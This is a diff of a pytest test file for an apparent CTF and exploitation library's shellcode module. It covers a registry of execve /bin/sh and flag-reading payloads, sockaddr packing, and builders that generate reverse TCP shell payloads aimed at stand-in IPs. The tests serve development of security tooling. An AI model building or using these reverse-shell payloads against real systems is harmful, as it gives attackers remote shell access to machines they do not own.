@@ -1,117 +1,150 @@
+# tests/test_shellcode.py
 import ipaddress
 import pytest
 
 from pwnkit.shellcode import (
-    SHELLCODESTORE,
-    ShellcodeStore,
-    Shellcode,
-    ShellcodeBuilder,
+    SHELLCODES,
+    ShellcodeReigstry,   # spelling per module
     hex_shellcode,
     build_sockaddr_in,
+    list_shellcodes,
+    Shellcode,
+    ShellcodeBuilder,
 )
-from pwnkit.ctx import Arch  # Arch = Literal["amd64", "i386", "arm", "aarch64"]
 
-
+# ---------------------------
+# hex_shellcode
+# ---------------------------
 def test_hex_shellcode_bytes_and_str():
-    assert hex_shellcode(b"\x90\xcc") == "\\x90\\xcc"
-    assert hex_shellcode("AB") == "\\x41\\x42"
+    assert hex_shellcode(b"\x90\x90\xcc") == r"\x90\x90\xcc"
+    assert hex_shellcode("ABC") == r"\x41\x42\x43"
 
 
-@pytest.mark.parametrize(
-    "ip,port,expected_prefix",
-    [
-        ("127.0.0.1", 4444, b"\x02\x00\x11\x5c\x7f\x00\x00\x01"),
-        ("10.11.12.13", 31337, b"\x02\x00\x7a\x69\x0a\x0b\x0c\x0d"),
-    ],
-)
-def test_build_sockaddr_in(ip, port, expected_prefix):
-    buf = build_sockaddr_in(ip, port)
+# ---------------------------
+# build_sockaddr_in
+# ---------------------------
+def test_build_sockaddr_in_loopback_4444():
+    buf = build_sockaddr_in("127.0.0.1", 4444)  # 0x115c
     assert isinstance(buf, (bytes, bytearray))
     assert len(buf) == 16
-    # AF_INET (2, little-endian) + port (big-endian) + addr (big-endian)
-    assert buf[:8] == expected_prefix
-    # trailing zero padding
-    assert buf[8:] == b"\x00" * 8
+    assert buf[0:2] == b"\x02\x00"                               # AF_INET LE
+    assert buf[2:4] == (4444).to_bytes(2, "big")                 # port BE
+    assert buf[4:8] == ipaddress.IPv4Address("127.0.0.1").packed # IP BE
+    assert buf[8:] == b"\x00" * 8                                # padding
 
 
-def test_registry_has_minimum_entries():
-    # sanity: a few well-known names exist
-    names_amd64 = set(SHELLCODESTORE.names("amd64"))
-    assert "execve_bin_sh" in names_amd64
-    assert "cat_flag" in names_amd64
-    names_i386 = set(SHELLCODESTORE.names("i386"))
-    assert "execve_bin_sh_21" in names_i386
+# ---------------------------
+# list_shellcodes inventory
+# ---------------------------
+def test_list_shellcodes_has_known_entries():
+    items = list(list_shellcodes())
+    assert any(s.startswith("amd64:execve_bin_sh:") for s in items)
+    assert "amd64:cat_flag" in items
+    assert any(s.startswith("i386:execve_bin_sh:") for s in items)
 
 
-def test_registry_get_returns_shellcode():
-    sc = SHELLCODESTORE.get("amd64", "execve_bin_sh")
-    assert isinstance(sc.blob, (bytes, bytearray))
-    assert len(sc.blob) > 0
+# ---------------------------
+# ShellcodeReigstry.get — families & singletons
+# ---------------------------
+def test_get_family_default_min_variant_amd64():
+    sc = ShellcodeReigstry.get("amd64", "execve_bin_sh")
+    assert isinstance(sc, Shellcode)
     assert sc.arch == "amd64"
-    assert sc.name == "execve_bin_sh"
+    assert sc.name.endswith(":27")  # min by default
+    assert sc.blob == SHELLCODES["amd64"]["execve_bin_sh"][27]
+
+def test_get_family_explicit_variant_i386():
+    sc = ShellcodeReigstry.get("i386", "execve_bin_sh", variant=33)
+    assert sc.arch == "i386"
+    assert sc.name.endswith(":33")
+    assert sc.blob == SHELLCODES["i386"]["execve_bin_sh"][33]
+
+def test_get_singleton_cat_flag():
+    sc = ShellcodeReigstry.get("amd64", "cat_flag")
+    assert sc.arch == "amd64"
+    assert sc.name == "cat_flag"
+    assert sc.blob == SHELLCODES["amd64"]["cat_flag"]
 
 
-def test_registry_duplicate_rejected():
-    store = ShellcodeStore()
-    sc = Shellcode("demo", "amd64", b"\x90", "noop")
-    store.register(sc)
-    with pytest.raises(ValueError):
-        store.register(sc)  # duplicate
+# ---------------------------
+# ShellcodeReigstry.get — composite keys & fuzzy
+# ---------------------------
+def test_get_composite_key_arch_in_key_with_variant():
+    sc = ShellcodeReigstry.get(None, "amd64:execveat_bin_sh:29")
+    assert sc.arch == "amd64"
+    assert sc.name.endswith(":29")
+    assert sc.blob == SHELLCODES["amd64"]["execveat_bin_sh"][29]
+
+def test_get_composite_key_arch_in_key_default_variant():
+    sc = ShellcodeReigstry.get(None, "i386:execve_bin_sh")
+    assert sc.arch == "i386"
+    assert sc.name.endswith(":21")
+    assert sc.blob == SHELLCODES["i386"]["execve_bin_sh"][21]
+
+def test_fuzzy_single_hit_ls_current_dir():
+    sc = ShellcodeReigstry.get("amd64", "ls_")
+    assert sc.name == "ls_current_dir"
+    assert sc.blob == SHELLCODES["amd64"]["ls_current_dir"]
 
 
-def test_registry_missing_raises_keyerror():
-    store = ShellcodeStore()
-    with pytest.raises(KeyError):
-        store.get("amd64", "does_not_exist")
+# ---------------------------
+# ShellcodeReigstry.get — errors
+# ---------------------------
+def test_error_unknown_arch():
+    with pytest.raises(KeyError) as ei:
+        ShellcodeReigstry.get("mips", "execve_bin_sh")
+    assert "Unknown arch" in str(ei.value)
+
+def test_error_missing_name_lists_available():
+    with pytest.raises(KeyError) as ei:
+        ShellcodeReigstry.get("amd64", "does_not_exist")
+    msg = str(ei.value)
+    assert "No payload named" in msg and "Available:" in msg
+
+def test_error_bad_variant():
+    with pytest.raises(KeyError) as ei:
+        ShellcodeReigstry.get("i386", "execve_bin_sh", variant=9999)
+    assert "Variant 9999 not found" in str(ei.value)
+
+def test_error_arch_none_without_prefix():
+    with pytest.raises(ValueError) as ei:
+        ShellcodeReigstry.get(None, "execve_bin_sh")
+    assert "key lacks arch prefix" in str(ei.value)
 
 
-def test_builder_alpha_amd64_seeds():
-    b = ShellcodeBuilder("amd64")
-    # different registers should change the first byte (seed), payload suffix stays same length
-    s_rax = b.build_alpha_shellcode("rax")
-    s_rbx = b.build_alpha_shellcode("rbx")
-    assert isinstance(s_rax, (bytes, bytearray))
-    assert isinstance(s_rbx, (bytes, bytearray))
-    assert s_rax != s_rbx
-    # both are ASCII-only
-    assert all(32 <= c <= 126 for c in s_rax)
-    assert all(32 <= c <= 126 for c in s_rbx)
+# ---------------------------
+# ShellcodeBuilder — amd64
+# ---------------------------
+def test_shellcode_builder_reverse_tcp_connect_contains_ip_port_amd64():
+    b = ShellcodeBuilder("amd64").build_reverse_tcp_connect("10.11.12.13", 31337)
+    ip_be = ipaddress.IPv4Address("10.11.12.13").packed
+    port_be = (31337).to_bytes(2, "big")
+    assert port_be + ip_be in b
 
+def test_shellcode_builder_reverse_tcp_shell_contains_ip_port_amd64():
+    b = ShellcodeBuilder("amd64").build_reverse_tcp_shell("192.0.2.7", 4444)
+    ip_be = ipaddress.IPv4Address("192.0.2.7").packed
+    port_be = (4444).to_bytes(2, "big")
+    assert port_be + ip_be in b
+    assert b"/bin/sh\x00" in b
 
-def test_builder_alpha_i386_not_implemented():
-    b = ShellcodeBuilder("i386")
+def test_shellcode_builder_alpha_seed_prefix_amd64():
+    b = ShellcodeBuilder("amd64").build_alpha_shellcode("rbx")
+    assert isinstance(b, (bytes, bytearray))
+    assert b.startswith(b"S")  # 'rbx' → 'S'
+
+def test_shellcode_builder_alpha_unsupported_arch():
     with pytest.raises(NotImplementedError):
-        b.build_alpha_shellcode("eax")  # any value should raise for now
+        ShellcodeBuilder("arm").build_alpha_shellcode("rdi")
 
 
-@pytest.mark.parametrize(
-    "ip,port",
-    [("127.0.0.1", 4444), ("8.8.8.8", 80)],
-)
-def test_builder_reverse_tcp_connect_amd64(ip, port):
-    b = ShellcodeBuilder("amd64")
-    blob = b.build_reverse_tcp_connect(ip, port)
-    assert isinstance(blob, (bytes, bytearray))
-    assert len(blob) > 0
-    # Verify the encoded IP:PORT are present (big-endian network order)
-    ip_be = ipaddress.IPv4Address(ip).packed
-    port_be = port.to_bytes(2, "big")
-    assert port_be + ip_be in blob
-
-
-def test_builder_reverse_tcp_shell_amd64_contains_markers():
-    b = ShellcodeBuilder("amd64")
-    blob = b.build_reverse_tcp_shell("127.0.0.1", 4444)
-    assert isinstance(blob, (bytes, bytearray))
-    assert len(blob) > 0
-    # Contains '/bin/sh\\x00' immediate used in payload
-    assert b"/bin/sh\x00" in blob
-
-
-def test_builders_not_available_on_i386():
-    b = ShellcodeBuilder("i386")
-    with pytest.raises(NotImplementedError):
-        b.build_reverse_tcp_connect("127.0.0.1", 4444)
-    with pytest.raises(NotImplementedError):
-        b.build_reverse_tcp_shell("127.0.0.1", 4444)
+# ---------------------------
+# ShellcodeBuilder — i386 reverse tcp shell
+# ---------------------------
+def test_shellcode_builder_reverse_tcp_shell_contains_ip_port_i386():
+    b = ShellcodeBuilder("i386").build_reverse_tcp_shell("203.0.113.5", 1337)
+    ip_be = ipaddress.IPv4Address("203.0.113.5").packed
+    port_be = (1337).to_bytes(2, "big")
+    assert ip_be in b
+    assert port_be in b
 
